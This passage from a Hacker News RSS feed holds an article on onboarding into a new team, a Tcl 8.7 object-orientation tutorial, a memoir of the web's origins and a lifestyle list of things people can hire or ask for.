In that meeting you have a simple agenda:</p>
<ul>
<li>For the first 25 minutes: ask them to tell you everything they think you
should know. Take copious notes. Only stop them to ask about things you donâ€™t
understand. Always stop them to ask about things you donâ€™t understand.</li>
<li>For the next 3 minutes: ask about the biggest challenges the team has right
now.</li>
<li>In the final 2 minutes: ask who else you should talk to. Write down every
name they give you.</li>
</ul>
<p>Repeat the above process for every name youâ€™re given. Donâ€™t stop until there
are no new names.</p>
<p>The sum of the answers from the first 25 mins will not give you a complete
picture of the teamâ€™s work. That will take months to develop. But they will
give you a framework for integrating new information more quickly, which will
speed up how fast you ramp. It will also heavily over index on the areas of
work under active discussion, which will help you dive in productively to the
most critical discussions immediately. The nature of what people choose to
discuss is a very valuable signal about the problems the team face, as it may
be about the work, the organization, or process. Finally, it will give you a
sense of the language and terminology that can very often be a barrier to
working smoothly with teams.</p>
<p>The answers from the second question give you a cheat sheet on how to impress
the team with early positive impact. Some of the things youâ€™ll hear will take
time to fix, such as â€œwe need a bigger teamâ€ or â€œour infrastructure isnâ€™t
scaling.â€ Those are important and it will be good for the team to hear you
internalize those challenges. But a surprising number of the issues youâ€™ll
hear repeatedly will be things you can easily help with, like â€œwe waste a
bunch of time in meetings every weekâ€ or â€œwe need a dedicated conference
room.â€ I start with the latter as quickly as I can because those are the
types of things teams often neglect to prioritize, in spite of a compounding
negative impact on progress.</p>
<p>The third question will give you a valuable map of influence in the
organization. The more often names show up and the context in which they show
up tends to provide a very different map of
the organization than the one in the <a href="http://boz.com/articles/damn-the-org-chart.html">org chart</a>.</p>
<p>For all the value I just described, the greatest value in this process isnâ€™t
in the answers â€” it is in the asking. Taking these meetings and listening
shows proper respect for the team thatâ€™s in place. It can be hard to remember,
but while you may be insecure about taking a new role because you feel like
youâ€™re at a disadvantage, the people youâ€™re speaking with may also be unsure
about you taking that role and what it means for them. Demonstrating mutual
respect builds the trust required to make progress.</p></section></div></div>]]>
            </description>
            <link>https://boz.com/articles/career-cold-start</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514098</guid>
            <pubDate>Wed, 23 Dec 2020 03:34:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Voting System Examination of Election Systems and Software EVS 6.1.1.0 [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25514069">thread link</a>) | @js2
<br/>
December 22, 2020 | https://www.sos.state.tx.us/elections/forms/sysexam/brian-mechler-ESS-exam-report-EVS6110-aug.pdf | <a href="https://web.archive.org/web/*/https://www.sos.state.tx.us/elections/forms/sysexam/brian-mechler-ESS-exam-report-EVS6110-aug.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.sos.state.tx.us/elections/forms/sysexam/brian-mechler-ESS-exam-report-EVS6110-aug.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514069</guid>
            <pubDate>Wed, 23 Dec 2020 03:27:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tcl 8.7 Part 8: TclOO]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25514055">thread link</a>) | @blacksqr
<br/>
December 22, 2020 | https://www.magicsplat.com/blog/tcl87-oo/ | <a href="https://web.archive.org/web/*/https://www.magicsplat.com/blog/tcl87-oo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <header>
                        
                        <p>
                            Published <time datetime="2020-05-23+0000">2020-05-23</time>
                        </p>
                    </header>
                    <p>
                        This is the eighth in a series of <a href="https://www.magicsplat.com/blog/tags/tcl-8-7/">posts</a> about new features in the upcoming version 8.7 of Tcl. It describes several enhancements to Tcl's features for object-oriented programming.
                    </p><!-- more -->
                    <blockquote>
                        <p>
                            To take Tcl 8.7 for a spin, you can download the <a href="https://sourceforge.net/projects/tcl/files/Tcl/8.7a3/">source</a> distribution. Binary distributions for Windows are available from <a href="https://sourceforge.net/projects/magicsplat/files/barebones-tcl/">magicsplat</a> and <a href="http://www.bawt.tcl3d.org/download.html#tclbi">BAWT</a>.
                        </p>
                    </blockquote>
                    <p>
                        <strong>NOTE:</strong> If you are not familiar with the object-oriented programming features in Tcl 8.6, see this <a href="https://www.magicsplat.com/articles/oo.html">tutorial</a>.
                    </p>
                    <p>
                        These enhancements, courtesy <a href="https://wiki.tcl-lang.org/page/Tcl+Core+Team">TCT</a> member <a href="https://wiki.tcl-lang.org/page/Donal+Fellows">Donal Fellows</a>, include
                    </p>
                    <ul>
                        <li>Private variables and methods
                        </li>
                        <li>Inline <code>export</code> / <code>unexport</code> modifiers
                        </li>
                        <li>Additional slot operations
                        </li>
                        <li>Class variables and methods
                        </li>
                        <li>Singleton and abstract classes
                        </li>
                        <li>Convenience commands for common operations
                        </li>
                        <li>Hooks for extending the class and object definition language
                        </li>
                        <li>Utilities for creating custom definition dialects
                        </li>
                    </ul>
                    <p>
                        Some of the above do not introduce any new capabilities into Tcl. Rather they make some programming idioms more convenient and formalize some implementation dependent behaviors.
                    </p>
                    <p>
                        Describing all the above would make for a rather lengthy post so this post only covers the first three. The remaining will be the topic of a future post.
                    </p>
                    <h2>
                        Private variables and methods
                    </h2>
                    <p>
                        A limitation of TclOO in 8.6 was that methods were either exported (aka public), which made them callable from all contexts, or not exported which made them callable only from within the object's context. The latter includes <em>all</em> methods defined for that object including those in subclasses, mixins, filters etc. This broke isolation between class definitions.
                    </p>
                    <ul>
                        <li>
                            <p>
                                An author of a subclass had to be careful when defining a method (even unexported) not to give it the same name as a method in the superclass.
                            </p>
                        </li>
                        <li>
                            <p>
                                At the same time, if the superclass implementation changed, necessitating the addition of a new method for private use, there is the risk that it will be hidden by a method of the same name in a subclass. Since the two classes may be written by different authors or teams, and the superclass may not be even aware of the existence of the subclass that uses it, this is a real risk.
                            </p>
                        </li>
                    </ul>
                    <p>
                        Here is an example, contrived as always. We have a <code>Service</code> class which acts as a base for various kinds of services (daemons for the Unix weenies), database, network and so on. It has <code>stop</code> and <code>abort</code> methods which end the service both of which call <code>Terminate</code> to exit.
                    </p>
                    <pre><code>oo::class create Service {
    method Terminate {code} { puts "Exiting with code $code" }
    method stop {} { my Terminate 0 }
    method abort {} { my Terminate 1 }
}</code></pre>
                    <p>
                        The service is obedient and stops when told.
                    </p>
                    <pre><code>% Service create service
::service
% service stop
Exiting with code 0</code></pre>
                    <p>
                        Now along comes a programmer who appreciates the extensive functionality of our class and extends it to write a network server.
                    </p>
                    <pre><code>oo::class create NetworkService {
    superclass Service
    method accept {client} { blah blah }
    method disconnect {client} {
        # Do some cleanup
        my Terminate $client; # close connection
    }
    method Terminate {client} {
        puts "Closing client connection"
    }
}</code></pre>
                    <p>
                        Unfortunately, now the service does not stop when commanded to do so. It tries to close some imaginary client connection instead.
                    </p>
                    <pre><code>% NetworkService create netservice
::netservice
% netservice stop
Closing client connection</code></pre>
                    <p>
                        The problem of course is that the utility method <code>Terminate</code> has been unknowingly overridden. There is no isolation provided for the parent class from any of its child classes.
                    </p>
                    <p>
                        In Tcl 8.7, you can define <em>private</em> methods to fix this. Calls to a method marked private will never be overridden in the context of the class that defines that method.
                    </p>
                    <p>
                        Let us try it out in our example. Instead of rewriting the class, we'll just do some targeted surgery to redefine the method as private.
                    </p>
                    <pre><code>% oo::define Service {deletemethod Terminate}
% oo::define Service {private method Terminate {code} {puts "Exiting with code $code"}}
% netservice stop
Exiting with code 0</code></pre>
                    <p>
                        As an aside, notice TclOO's dynamic nature â€” the existing <code>netservice</code> <strong>object</strong> also picked up the corrected behaviour.
                    </p>
                    <p>
                        Some additional points:
                    </p>
                    <ul>
                        <li>
                            <p>
                                Variables suffer from similar problems for similar reasons. A class may inadvertently name a variable that is already in use for a different purpose in a superclass or mixin. This is also resolved by defining variables as <code>private variable</code> analogously to private methods.
                            </p>
                        </li>
                        <li>
                            <p>
                                Methods that are forwards can also be defined with the <code>private</code> designation.
                            </p>
                        </li>
                        <li>
                            <p>
                                Private methods are not just for classes but can also be defined for objects though they are less useful there as objects themselves cannot be derived from.
                            </p>
                        </li>
                        <li>
                            <p>
                                Just like <code>oo:define</code>, <code>private</code> can either be used to define a single method as above or take a single argument which is a script within which multiple methods, forwards and variables are defined. This is convenient for clubbing together the entire private section of a class.
                            </p>
                        </li>
                        <li>
                            <p>
                                The <code>info class</code> and <code>info object</code> introspection commands take a new <code>-scope</code> option.
                            </p>
                        </li>
                    </ul>
                    <pre><code>% info class methods Service -scope private
Terminate
% info class methods Service -scope public
abort stop
% info class methods Service -scope unexported
% </code></pre>
                    <p>
                        The <code>unexported</code> value corresponds roughly (but not exactly!) to protected in C++ terminology. They are not visible from outside the object's context but because they are not private, they are callable from methods defined in subclasses. We did not have any in our example.
                    </p>
                    <p>
                        See <a href="https://core.tcl-lang.org/tips/doc/trunk/tip/500.md">TIP 500</a> for more examples of private methods and variables.
                    </p>
                    <h2>
                        Inline export modifiers
                    </h2>
                    <p>
                        In Tcl 8.6 methods were exported by default based on whether they started with a lowercase letter or not. You could change the visibility of a method using the <code>export</code> and <code>unexport</code> commands. For example,
                    </p>
                    <pre><code>oo::class create Users {
    variable users
    method +user {name address} { set users($name) $address}
    method -user {name} { unset -nocomplain users($name) }
    export +user -user
}</code></pre>
                    <p>
                        Because they do not begin with a lower case letter, the methods to add and remove users have to be explicitly exported. Separating the visibility from the method definition is somewhat of an irritation so Tcl 8.7 allows you to modify it with the <code>-export</code> option in the method definition itself.
                    </p>
                    <pre><code>oo::class create Users {
    variable users
    method +user -export {name address} { set users($name) $address}
    method -user -export {name} { unset -nocomplain users($name) }
}</code></pre>
                    <p>
                        Conversely, there is an <code>-unexport</code> option that will hide a method that would be exported by the default rules.
                    </p>
                    <h2>
                        New slot operations
                    </h2>
                    <p>
                        First, some background. One of the special features of Tcl's OO system is that unlike other languages it is completely dynamic in keeping with Tcl's philosophy. Class structures, relationships, object types, interfaces can all be manipulated <strong>even at runtime</strong>.
                    </p>
                    <p>
                        Continuing our tradition of silly examples, suppose our web server defines a request class as follows. All methods are guarded by a <a href="https://www.magicsplat.com/articles/oo.html#sect_oo_filters">filter</a> that denies access based on client location.
              â€¦</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.magicsplat.com/blog/tcl87-oo/">https://www.magicsplat.com/blog/tcl87-oo/</a></em></p>]]>
            </description>
            <link>https://www.magicsplat.com/blog/tcl87-oo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514055</guid>
            <pubDate>Wed, 23 Dec 2020 03:25:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[30 Years Later: Early Days of the Web]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25513720">thread link</a>) | @DanielKehoe
<br/>
December 22, 2020 | https://blog.yax.com/posts/early-days-of-the-web-1991/ | <a href="https://web.archive.org/web/*/https://blog.yax.com/posts/early-days-of-the-web-1991/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <div itemprop="articleBody">
                    
                    <hr> 
                    <p>The web is thirty years old this month, counting from the date the <a href="https://www.w3.org/2012/08/history-of-the-web/origins.htm">first web server was launched on Christmas 1990</a>. Personally, August 6th, 1991, is more significant, when the web was publicly announced.</p>

<p>In 1991 I was writing for <em>NeXTWORLD</em> magazine, which was a lot of fun, because I got to work with, and write about, people who were doing fascinating things with computer technology. Working for <em>NeXTWORLD</em> led to writing the book <em>Taking the Next Step</em> and a short stint at Steve Jobsâ€™s <a href="https://en.wikipedia.org/wiki/NeXT">NeXT</a> as a technical writer.</p>

<p>The most innovative project I encountered that year was not NeXT. Rather, it was something developed by Tim Berners-Lee, a researcher at CERN, the European particle physics laboratory. He used a NeXT computer to develop a networked information system for high-energy physicists. If I hadnâ€™t been reading  the <em>comp.sys.next</em> Usenet newsgroups carefully, I would have missed the announcement of a â€œa hypertext editor for the NeXT.â€</p>

<p>Not many people used â€œWWWNeXTStepEditor version 0.12.â€ The NeXT community was small and many NeXT computer users did not yet have Internet access, which was required to access Tim Berners-Leeâ€™s experimental â€œWorldWideWebâ€ documents. To me, the name WorldWideWeb seemed a bit of a conceit since the only users at the time were high-energy physicists at a few research institutes.</p>

<p>Nonetheless, as soon Iâ€™d installed and tried the software, I wanted to get involved. I told everyone about it, including a fellow editor at <em>NeXTWORLD,</em> <a href="https://en.wikipedia.org/wiki/John_Perry_Barlow">John Perry Barlow</a>. Barlow, a lyricist for the Grateful Dead, and cofounder of the (then-new) Electronic Frontier Foundation, wrote to his friend <a href="https://en.wikipedia.org/wiki/Mitch_Kapor">Mitch Kapor</a>â€¦</p>

<p><img src="https://blog.yax.com/images/post1-barlow.gif" alt=""></p>

<p>If you donâ€™t recognize Barlowâ€™s references, <a href="https://en.wikipedia.org/wiki/Project_Xanadu" title="Project Xanadu">Project Xanadu</a> was a visionary hypertext project that predated the Internet. The Matrix is not the movie universe created by the Wachowskis but, rather the network of computer networks that existed before the commercialization of the Internet (as described by the researcher <a href="https://en.wikipedia.org/wiki/John_Quarterman">John Quarterman</a>).</p>

<p>Subsequently I joined the <a href="https://lists.w3.org/Archives/Public/www-talk/1991SepOct/0001.html">www-talk mailing list</a> and also contacted Tim Berners-Lee directly. I wanted to know if he was interesting in technology Iâ€™d heard about from friends at Adobe Systems. Adobeâ€™s editable PostScript specification (which came to be named PDF and became the basis for a product named â€œAcrobatâ€) seemed to me a better match for distributed hypertext than the very-limited SGML-based â€œHTML tagsâ€ that Tim Berners-Lee was using. HTML offered only minimal layout and styling possibilities; <a href="https://en.wikipedia.org/wiki/PostScript">PostScript</a> was a better page description language.</p>

<p>Hereâ€™s an excerptâ€¦</p>

<p><img src="https://blog.yax.com/images/post1-timbl.gif" alt=""></p>

<p>Tim Berners-Lee was reluctant to publicize that code for the web was available for free, as management at CERN had not yet agreed to release it publicly (that didnâ€™t happen until <a href="https://cds.cern.ch/record/1164399">April 1993</a>), and I wasnâ€™t able to write about it for <em>NeXTWORLD</em> (too bad, as I could have been the first journalist to write about the web!).</p>

<p>Subsequently, editable PostScript was released, and in 1993, <a href="https://en.wikipedia.org/wiki/Robert_Cailliau">Robert Cailliau</a> of CERN visited me in California. I arranged a meeting between Cailliau and management at Adobe Systems. He met with John Kunze of Adobe at the Stanford Linear Accelerator Center (SLAC) and demonstrated the World Wide Web â€” the first time management at Adobe had seen the Web. By that time, HTML was firmly entrenched as the native language of the new Web. Adobe later invested in Netscape Communications and produced an Acrobat plug-in for the Netscape Web browser, establishing the basis for viewing richly formatted PDF pages in web browsers.</p>

<p>For some years afterward, I regretted that the Adobe/WWW meeting had not taken place the previous year, because the sparse and limited HTML format might have been eclipsed by the richer format of PDF as the primary syntax of web pages. With the adoption of the <a href="http://www.w3.org/Style/LieBos2e/history/">Cascading Style Sheets specification</a> (from 1999 forward), my views changed, and Iâ€™ve come to appreciate that the technical underpinnings of the web are optimal, reflecting both the genius of Berners-Leeâ€™s original vision and the rich contributions of the worldwide developer community.</p>

<p>Thirty years later, it is easy to overlook the webâ€™s origins as a tool for sharing knowledge. Key to Tim Berners-Leeâ€™s vision were open standards that reflected his belief in the <a href="https://www.w3.org/2001/tag/doc/leastPower">Rule of Least Power</a>, a principle that choosing the simplest and least powerful language for a given purpose allows you to do more with the data stored in that language (thus HTML is easier for humans or machines to interpret and analyze than PostScript). Along with open standards and the Rule of Least Power, Tim Berners-Lee wanted to make it easy for anyone to publish information in the form of web pages. His first web browser, named Nexus, was both a browser and editor. The NeXTSTEP SDK made editing easy to implement; editing was abandoned in subsequent non-NeXT web browsers.</p>

<p>I think weâ€™ve lost sight of that original vision. Facebook or Wix make it easy to author web pages but at the cost of lock-in to proprietary systems. And when developers choose complex software such as React or Rails to build simple websites, I cringe at the violation of Rule of Least Power. I still have a â€œdeep case of net religionâ€ (as John Perry Barlow said in 1991) and Iâ€™m now writing about ways to build websites without frameworks and build tools (see my articles, <a href="https://tutorials.yax.com/articles/build-websites-the-yax-way/index.html">Build Websites the Yax Way</a>). My current project, <a href="https://yax.com/">Yax.com</a>, is a do-it-yourself website builder that uses new web standards (including web components) to help people build simple sites. Thirty years on, we still have a lot of work to do to realize the webâ€™s original goals. I hope Iâ€™m not the only one who sees this.</p>

<p>I never anticipated that Berners-Leeâ€™s NeXT hypertext project would become a medium to supplant print and television. In 1991, during idle moments, I imagined the worldâ€™s books and magazines might be reborn as hypertext (many others had imagined this earlier, including Ted Nelson, with his Xanadu project). But I never honestly believed that Berners-Leeâ€™s software project could change the world. By 1999, as Web addresses appeared on billboards and the sides of buses, I started to accept that Berners-Lee naming his project â€œthe WorldWide Webâ€ was not vainglorious but simply prescient. Still, I hope his original vision of the web as a means for sharing the worldâ€™s knowledge is not eclipsed by its utility as a platform for commerce.</p>

<p><img src="https://blog.yax.com/images/post1-signature-dmk.gif" alt=""></p>

                </div>
                
                

            </div>
        </div></div>]]>
            </description>
            <link>https://blog.yax.com/posts/early-days-of-the-web-1991/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513720</guid>
            <pubDate>Wed, 23 Dec 2020 02:21:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things You're Allowed to Do]]>
            </title>
            <description>
<![CDATA[
Score 401 | Comments 263 (<a href="https://news.ycombinator.com/item?id=25513713">thread link</a>) | @thesephist
<br/>
December 22, 2020 | https://milan.cvitkovic.net/writing/things_youre_allowed_to_do/ | <a href="https://web.archive.org/web/*/https://milan.cvitkovic.net/writing/things_youre_allowed_to_do/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<article>
    <p>This is a list of things youâ€™re allowed to do that you thought you couldnâ€™t, or didnâ€™t even know you could.</p>
<p>I havenâ€™t tried everything on this list, mainly due to cost.
But youâ€™d be surprised how cheap most of the things on this list are (especially the free ones).</p>
<p><strong>Note that you can replace â€œhireâ€ or â€œbuyâ€ with â€œbarter forâ€ or â€œfind a DIY guide toâ€ nearly everywhere below.</strong>
E.g. you can clean the bathroom in exchange for your housemate doing a couple hours research for you.</p>
<h3 id="learning-and-decision-making">Learning and decision making</h3>
<ul>
<li>Hire a researcher or expert consultant
<ul>
<li>I hired a researcher (<a href="https://acesounderglass.com/">Elizabeth Van Nostrand</a>, whom you can and should <a href="https://acesounderglass.com/hire-me/">hire</a> too) to help write this very post, which is largely about how to hire people to do things!</li>
<li>They can:
<ul>
<li>Help validate whether a crazy idea is possible</li>
<li>Do <a href="https://acesounderglass.com/tag/epistemicspotcheck/">epistemic spot checks</a> of your work</li>
<li>Map the landscape of opinions on a topic</li>
<li>Write literature surveys</li>
<li>Find people worth talking to about a potential topic and writing briefs about them</li>
<li>Opposition or market research</li>
<li>Find options for big purchases like houses or insurance</li>
<li>Compile datasets</li>
<li>Find un-Googleable things</li>
</ul>
</li>
<li>To find one:
<ul>
<li>Look for books or scholarly articles on the topic, and email the author
<ul>
<li>Graduate students are especially good, and often know more than the â€œexpertsâ€</li>
<li>If you find someone genuinely interested in what youâ€™re working on, you might be able to collaborate and not pay</li>
</ul>
</li>
<li>Look for interested individuals in the long tail of blogs
<ul>
<li>E.g. by Google searching with <code>"site: medium.com"</code> and finding the authors</li>
</ul>
</li>
<li>Use a matchmaking service (see <a href="#appendix-sources-of-experts">Appendix</a>)</li>
<li>Search through professional organizations directories (e.g. Bar Association, American Academy of Pediatrics)</li>
<li>Google the topic +
<ul>
<li>â€œblogâ€</li>
<li>â€œpodcastâ€</li>
<li>â€œexpert witnessâ€</li>
<li>â€œbookâ€</li>
<li>â€œconsultantâ€</li>
<li>â€œredditâ€</li>
</ul>
</li>
</ul>
</li>
<li>What do I pay them?
<ul>
<li>Some post their prices online</li>
<li>If youâ€™re hiring a grad student you can pay them at or above their schoolâ€™s graduate student stipend, which you can Google.</li>
<li><a href="https://www.lesswrong.com/posts/evyBmPw9ZnzmoFmP6/experiment-a-good-researcher-is-hard-to-find">Make sure they get something out of the project</a> (and other tips)</li>
</ul>
</li>
</ul>
</li>
<li>Ask questions online
<ul>
<li>You know those answers you enjoy reading on Stack Exchange, Reddit, Quora, etc.?  Someone had to ask those questions. It can be you.</li>
<li>If youâ€™re embarrassed by the question, itâ€™s easy to be anonymous</li>
</ul>
</li>
<li>Run surveys
<ul>
<li>Twitter
<ul>
<li>Or ask someone with a larger following to do it</li>
</ul>
</li>
<li>Google Surveys</li>
<li>Amazon Mechanical Turk</li>
</ul>
</li>
<li>Run <a href="https://www.gwern.net/Nootropics#blinding-yourself">genuine randomized control trials on yourself</a></li>
<li>Buy research
<ul>
<li>See <a href="#appendix-sources-of-research">Appendix</a>, <a href="https://blog.alexa.com/sites-for-market-research/">here</a>, or <a href="https://web.jinfo.com/go/blog/73431">here</a></li>
<li>Or find it on <a href="https://twitter.com/Sci_Hub">SciHub</a> or <a href="https://twitter.com/libgen_project">Libgen</a></li>
</ul>
</li>
<li>Hire someone to pentest/doxx you
<ul>
<li>Or put out a bounty for it, like <a href="https://www.gwern.net/Blackmail#pseudonymity-bounty">Gwern used to</a></li>
</ul>
</li>
<li>Hire a graphic designer to turn your appalling sketches into beautiful diagrams or slides</li>
<li>Host small gatherings or conferences on topics you care about
<ul>
<li>These are much easier to set up than youâ€™d think, especially in the age of Zoom</li>
<li>If you can use the gathering to bootstrap a group chat or community, so much the better!</li>
</ul>
</li>
<li>Hire a tutor
<ul>
<li><a href="https://www.italki.com/">Language tutors</a> are surprisingly cheap and better than any app</li>
<li><a href="https://www.wyzant.com/">Wyzant</a> and many other sites exist for general tutoring</li>
<li>For niche tutoring you can try general freelance sites like <a href="https://www.fiverr.com/">Fiverr</a> or <a href="https://www.upwork.com/">Upwork</a></li>
<li>Services like <a href="https://www.sharpestminds.com/">Sharpest Minds</a> exist for professional training</li>
</ul>
</li>
<li>Hire someone just as an excuse to make yourself complete a project
<ul>
<li>Sure you could proofread your own document.  But if you hire a proofreader, you have to actually deliver them something at some point.</li>
</ul>
</li>
</ul>
<h3 id="interpersonal">Interpersonal</h3>
<ul>
<li><a href="https://guzey.com/personal/what-should-you-do-with-your-life/#cold-emails-and-twitter">Cold contact people</a>
<ul>
<li>Yes, even famous people. Just make sure you have something to say.</li>
</ul>
</li>
<li><a href="https://guzey.com/follow-up/">Follow up many times</a>
<ul>
<li>You wonâ€™t make people mad if youâ€™re polite.</li>
</ul>
</li>
<li>Just ask for things
<ul>
<li>Free upgrades</li>
<li>Coupons
<ul>
<li>At checkout you can just ask â€œDo you have any coupons I can apply to this?â€</li>
</ul>
</li>
<li>Raises</li>
<li>Better terms in a job offer
<ul>
<li>Easier than asking for a raise - you have more leverage</li>
</ul>
</li>
<li>Waiving admission or graduation requirements</li>
<li>Itâ€™s okay if the things are crazy.  You can always mollify afterward by saying â€œI know thatâ€™s a crazy thing to ask for, but I have a rule that I always ask.â€</li>
</ul>
</li>
<li><a href="http://mindingourway.com/obvious-advice/">Ask obvious questions</a></li>
<li>Buy goods/services from your friends
<ul>
<li>Itâ€™s not weird unless you make it weird</li>
<li>Everyone knows some starving artists and needs to buy holiday gifts</li>
<li>Doesnâ€™t apply to every service obviously: donâ€™t take out loans from your friends</li>
</ul>
</li>
<li>Not tell white lies
<ul>
<li>You can be nice and tell the truth at the same time.</li>
<li>Especially to children when they annoy you.</li>
</ul>
</li>
<li>Say â€œI donâ€™t knowâ€ or â€œI donâ€™t have an opinionâ€ when you donâ€™t</li>
<li>Ask people out on dates
<ul>
<li>This one might just be directed at young meâ€¦</li>
</ul>
</li>
<li>Donâ€™t drink, even when youâ€™re expected to
<ul>
<li>Donâ€™t drink alcohol, I mean.</li>
<li>Actually heck, donâ€™t drink water either if you donâ€™t want.</li>
</ul>
</li>
<li>Travel to friends just to visit them</li>
<li>Move close to friends</li>
<li>Live in multiple places with multiple people
<ul>
<li>Rent spare rooms or couches part-time in multiple homes</li>
<li>Arrange your own timeshare system with friends</li>
</ul>
</li>
<li>Be a nomad</li>
<li>Romance
<ul>
<li>Hire a matchmaker</li>
<li>Buy premium versions of dating apps</li>
<li>Get couples therapy</li>
</ul>
</li>
<li>Give to charity
<ul>
<li>You really can, to the best of our knowledge, <a href="https://www.givewell.org/giving101/Your-dollar-goes-further-overseas">save someoneâ€™s (statistical) life</a> with not that much money.
Let that idea really, fully osmose through your brain before you pass it over.</li>
</ul>
</li>
</ul>
<h3 id="support-and-accountability">Support and accountability</h3>
<ul>
<li>Hire a coach
<ul>
<li>For your professional area
<ul>
<li><a href="https://www.newyorker.com/magazine/2011/10/03/personal-best">An Atul Gawande article on the subject</a></li>
<li><a href="https://www.npr.org/2020/02/03/802422904/when-things-click-the-power-of-judgment-free-learning">On clicker training</a></li>
</ul>
</li>
<li>Personal trainer</li>
<li>Nutritionist</li>
<li>Meditation guide</li>
</ul>
</li>
<li>Visit a therapist</li>
<li>Visit a physical therapist</li>
<li>Buy task-specific devices that prevent multitasking
<ul>
<li>Kindle</li>
<li>Freewrite Traveller</li>
<li>Dedicated music players</li>
<li>Dedicated notebooks for specific purposes (day planner, exercise log, etc.)</li>
</ul>
</li>
<li>Engage a human productivity monitor
<ul>
<li>I know two people who have hired people to sit next to them or frequently contact them to keep them on-task</li>
<li>Examples: <a href="https://www.focusmate.com/">focusmate.com</a> and <a href="https://coding-pal.com/">coding-pal.com</a></li>
</ul>
</li>
</ul>
<h3 id="making-the-most-of-your-resources">Making the most of your resources</h3>
<ul>
<li>Grocery delivery</li>
<li>Cleaning services
<ul>
<li>Can be regular or just when you need a big spring clean</li>
<li>Donâ€™t forget carpet and vent cleaning</li>
</ul>
</li>
<li>Laundry service</li>
<li>Nannies over daycare</li>
<li>Modify your stuff
<ul>
<li>Tape over annoying LED lights</li>
<li>Remove logos (<a href="https://www.youtube.com/watch?v=WVeGDitPqKo">example</a>)</li>
<li>Write in books</li>
<li>Rip off tags</li>
<li>Rotate your monitor to portrait</li>
</ul>
</li>
<li>Repair your stuff, or get it repaired
<ul>
<li>Shoes</li>
<li>Clothes</li>
<li>Luggage and <a href="https://rainypass.com/">outdoor gear</a></li>
<li>Furniture</li>
<li>Car
<ul>
<li>You can buy at-home car care</li>
</ul>
</li>
</ul>
</li>
<li>Write on a post-it note affixed to a greeting card rather than on the greeting card itself, so the recipient can throw away the post-it and reuse your card
<ul>
<li>Employ similar logic for any disposable/consumable item</li>
</ul>
</li>
<li>Treat fines like payments
<ul>
<li>E.g. park illegally and let yourself think of the (expected value of the) fine as a parking fee</li>
<li>Obviously donâ€™t break rules that matter like blocking a fire exit</li>
</ul>
</li>
<li><a href="https://donotpay.com/">Contest unjust fines</a></li>
<li>Telemedicine</li>
<li>Surgery for appearance or comfort</li>
<li>At-home vet care</li>
<li>Enroll <a href="https://www.dummies.com/health/how-to-enroll-in-a-clinical-trial/">yourself</a> (or <a href="https://loyalfordogs.com/">your pet</a>) in a clinical trial or research study</li>
<li>Generate your own audiobooks
<ul>
<li><a href="https://gutenbergreloaded.com/collections/all">gutenbergreloaded.com</a></li>
</ul>
</li>
<li>Generate your own ebooks
<ul>
<li><a href="https://1dollarscan.com/">1dollarscan.com</a></li>
</ul>
</li>
<li>Get verbal things written down
<ul>
<li><a href="https://transcribeme.com/">transcribeme.com</a></li>
<li><a href="https://otter.ai/">otter.ai</a></li>
</ul>
</li>
<li>Personal assistant services (or a real PA if you can afford it)
<ul>
<li><a href="https://getmagic.com/">Magic</a>, <a href="https://www.taskrabbit.com/">TaskRabbit</a>, <a href="https://www.fancyhands.com/">Fancy Hands</a>, and similar services can approximate many of these.
There are also more serious services like <a href="https://withdouble.com/">Double</a>.</li>
<li>Manage email</li>
<li>Helping you move</li>
<li>Getting visas and arranging travel</li>
<li>Stand in line for you</li>
<li>Errands</li>
<li>Filing paperwork</li>
</ul>
</li>
<li>And if you grew up in a thrifty family, like me:
<ul>
<li>Paying for parking in convenient location</li>
<li>Hotels where you can sleep comfortably</li>
<li>Non-public transportation, especially when traveling</li>
<li>Buying comfortable mattress, shoes, etc.</li>
<li>Buying clothes for appearance or comfort instead of just the lowest price</li>
<li>Bottled water when youâ€™re thirsty
<ul>
<li>And in general fulfilling any bodily need for &lt; $5 (restrooms, buying a hat when you forgot yours, etc.)</li>
</ul>
</li>
<li>Buy your way out of advertising on e.g. Spotify or YouTube</li>
<li>Actually turn the heat/AC on
<ul>
<li>And in general, <a href="https://radimentary.wordpress.com/2018/01/29/hammertime-day-1-bug-hunt/">being willing to spend a few minutes to fix small annoyances</a></li>
<li>Seriously, just put WD-40 on that squeaky hinge already</li>
</ul>
</li>
</ul>
</li>
</ul>

<ul>
<li>Katja Graceâ€™s <a href="https://meteuphoric.com/2014/03/25/how-to-trade-money-and-time/">How to trade money and time</a></li>
<li>Sam Bowmanâ€™s <a href="https://medium.com/@s8mb/things-i-recommend-you-buy-and-use-second-edition-457a8e7163f6">Things I Recommend You Buy and Use</a></li>
<li>Rob Wiblin <a href="https://medium.com/@robertwiblin/things-i-recommend-you-buy-and-use-rob-edition-1d7b2ce27d68">channeling Sam</a></li>
<li><a href="https://www.lesswrong.com/posts/KuFSkLwhSkEZJYALE/collating-widely-available-time-money-trades">Estimated hourly costs of buying free time</a> (see comments)</li>
</ul>
<hr>
<p><em>Thanks to
<a href="https://www.gwern.net/">Gwern</a>,
<a href="https://twitter.com/an1lam">Stephen Malina</a>,
<a href="https://twitter.com/alexeyguzey">Alexey Guzey</a>,
<a href="https://twitter.com/robot__dreams">Elliot Jin</a>,
<a href="https://twitter.com/iandanforth">iandanforth</a>,
<a href="https://twitter.com/jmclulow">Joshua M. Clulow</a>,
<a href="https://twitter.com/K4y1s">Kay</a>,
